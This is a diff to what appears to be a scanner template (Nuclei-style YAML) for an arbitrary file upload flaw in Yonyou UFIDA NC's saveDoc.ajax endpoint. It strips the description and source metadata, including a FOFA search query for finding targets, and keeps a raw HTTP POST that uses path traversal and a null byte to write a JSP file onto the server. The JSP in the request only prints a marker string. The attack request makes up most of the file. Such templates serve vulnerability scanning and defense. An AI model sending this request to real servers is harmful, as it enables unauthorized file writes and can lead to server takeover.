@@ -3,15 +3,11 @@ info:
   name: 用友-UFIDA-NC saveDoc.ajax 存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ztfff07un0a32hxi'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ztfff07un0a32hxi
-    fofa: title="产品登录界面"
 http:
 - raw:
-  - "POST /uapws/saveDoc.ajax?ws=/../../dudesite.jspx%00 HTTP/1.1\n\nContent-Type: application/x-www-form-urlencoded\n\n\n\ncontent=<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n\n      <hi:directive.page import=\"java.util.*,java.io.*,java.net.*\"/>\n\n   <hi:scriptlet>\n\n            out.println(\"dudesite\");\n\n   </hi:scriptlet>\n\n</hi>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n/uapws/dudesite.jspx"
+  - "POST /uapws/saveDoc.ajax?ws=/../../dudesite.jspx%00 HTTP/1.1\n\nContent-Type: application/x-www-form-urlencoded\n\ncontent=<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n\n      <hi:directive.page import=\"java.util.*,java.io.*,java.net.*\"/>\n\n   <hi:scriptlet>\n\n            out.println(\"dudesite\");\n\n   </hi:scriptlet>\n\n</hi>\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n/uapws/dudesite.jspx"
   redirects: false
   matchers:
   - status:
